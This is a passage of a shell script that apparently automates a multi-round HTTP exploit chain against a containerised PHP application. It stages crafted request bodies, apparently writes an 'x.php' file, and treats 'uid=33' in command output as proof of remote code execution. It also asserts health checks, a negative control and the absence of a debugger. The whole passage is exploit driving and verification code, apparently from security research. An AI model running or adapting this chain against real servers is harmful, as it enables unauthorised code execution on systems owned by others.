    fail="$fail xphp=${XSZ:-?}"
  fi
  [ "${NEG_UID:-1}" = "0" ] || fail="$fail negctrl_has_uid33"
  case "$RCE" in *uid=33*) : ;; *) fail="$fail judge_no_uid33" ;; esac
  [ "${HEALTH:-x}" = "200" ] || fail="$fail health=${HEALTH:-?}"
  if [ -n "$fail" ]; then
    echo "ASSERT4 FAIL round=$1$fail"
    return 1
  fi
  echo "ASSERT4 OK round=$1 grow=$SESS_SP_ACTUAL prime=$PRIME_CODE fatal=${PRIME_FATAL_NOTE:-$PRIME_FATAL} sleeper_markers=$P4W_MARKERS sleepers_alive=${P4W_SLEEPERS_ALIVE:-?} primed_pid=${P4W_PRIMED_PID:-inferred:$P4W_FREE_PID} free_pid=$P4W_FREE_PID sr2a=$SR_2A sr2ak2=$SR_2AK2 r2a=$R2A_CODE r2ak2=$R2AK2_CODE r3=$R3_CODE xphp=${XSZ}B negctrl_no_uid33=1 health=$HEALTH"
  return 0
}
round_run() {
  local r1 r2a r1k2 r2ak2 r3 xsz rce
  kill_sleepers
  clean_round || return 1
  mkprog "$CODE"
  r1=$(post "$W/progbody")
  prime || { echo "ROUND $1: PRIME1 FAIL"; return 1; }
  local p1=$PRIME_CODE
  mkbody r2a "$AIM" "$CODE"
  r2a=$(post "$W/stagebody"); SR_2A=$(sess_size "$SID_SR")
  [ "$WORKERS" = "4" ] && sleepers_alive
  [ "$WORKERS" = "4" ] && kill_sleepers
  mkprog K2
  r1k2=$(post "$W/progbody")
  prime || { echo "ROUND $1: PRIME2 FAIL"; return 1; }
  local p2=$PRIME_CODE
  mkbody r2a "$AIM" K2
  r2ak2=$(post "$W/stagebody"); SR_2AK2=$(sess_size "$SID_SR")
  [ "$WORKERS" = "4" ] && sleepers_alive
  [ "$WORKERS" = "4" ] && kill_sleepers
  prime || { echo "ROUND $1: PRIME3 FAIL"; return 1; }
  local p3=$PRIME_CODE
  mkbody r3 "$AIM_W" K3
  r3=$(post "$W/stagebody")
  [ "$WORKERS" = "4" ] && sleepers_alive
  [ "$WORKERS" = "4" ] && kill_sleepers
  R2A_CODE=$r2a; R2AK2_CODE=$r2ak2; R3_CODE=$r3
  judge
  xsz=${XSZ:-MISSING}
  echo "ROUND $1: R1(code)=$r1 prime=$p1 R2a(code)=$r2a sr=${SR_2A}B R1(K2)=$r1k2 prime=$p2 R2a(K2)=$r2ak2 sr=${SR_2AK2}B prime=$p3 R3=$r3 x.php=${xsz}B RCE=$RCE"
  assert_round "$1" || return 1
  [ "$WORKERS" = "4" ] && { assert4_round "$1" || return 1; }
  return 0
}
sampler_selftest() { # negative control: attach a debugger inside container, sampler must see it
  echo "== sampler self-test (negative control; not counted in PASS)"
  sampler_start
  sleep 0.5
  local pid; pid=$(cpid)
  docker exec -d "$CAL" gdb -batch -q -p "$pid" -ex 'shell sleep 3' >/dev/null 2>&1 || \
    docker exec -d "$CAL" sh -c 'gdb -batch -q -p '"$pid"' -ex "shell sleep 3"' >/dev/null 2>&1 || true
  sleep 3.0
  sampler_stop
  local h; h=$(sampler_total)
  echo "SAMPLER SELF-TEST hits=$h (expect >0)"
  [ "$h" -gt 0 ] && exit 0 || exit 1
}

echo "== r41_http_chain stage=$STAGE PROFILE=$PROFILE WORKERS=$WORKERS CAL=$CAL URL=$URL ROUNDS=$ROUNDS CLEAN=$CLEAN P4W_GDB=$P4W_GDB"
install_pages
case "$STAGE" in
  selftest) sampler_selftest ;;
  run)
    sampler_start
    pass=0
    for r in $(seq 1 "$ROUNDS"); do
      round_run "$r" && pass=$((pass + 1))
    done
    sampler_stop
    kill_sleepers
    GHITS=$(sampler_total)
    judge
    echo "NO-GDB CHECK rounds=$ROUNDS gdb_hits=$GHITS"
    echo "PASS=$pass/$ROUNDS"
    echo "$RCE"
    [ "$pass" -eq "$ROUNDS" ] && exit 0 || exit 1 ;;
  prime) prime; kill_sleepers; echo "prime=$PRIME_CODE fatal=$PRIME_FATAL child_same=$([ "$PRIME_PID_BEFORE" = "$PRIME_PID_AFTER" ] && echo 1 || echo 0) free=${P4W_FREE_PID:-?} markers=${P4W_MARKERS:-0} primed=${P4W_PRIMED_PID:-?}"; exit 0 ;;
  r1) mkprog "${KEY:-$CODE}"; echo "r1=$(post "$W/progbody") sr=$(sess_size "$SID_SR")"; exit 0 ;;
  r2a) mkbody r2a "${AIM:--103416}" "${KEY:-$CODE}"; echo "r2a=$(post "$W/stagebody") sr=$(sess_size "$SID_SR")"; exit 0 ;;
  r2b) mkbody r2a "${AIM:--103416}" "${KEY:-K2}"; echo "r2b=$(post "$W/stagebody") sr=$(sess_size "$SID_SR")"; exit 0 ;;
  r3) mkbody r3 "${AIM_W:--109505}" "${KEY:-K3}"; echo "r3=$(post "$W/stagebody")"; judge; echo "x.php=${XSZ:-MISSING}B"
      case "$RCE" in *uid=33*) exit 0 ;; *) exit 1 ;; esac ;;
  *) echo "unknown STAGE=$STAGE (run|prime|r1|r2a|r2b|r3|selftest)" >&2; exit 2 ;;
esac
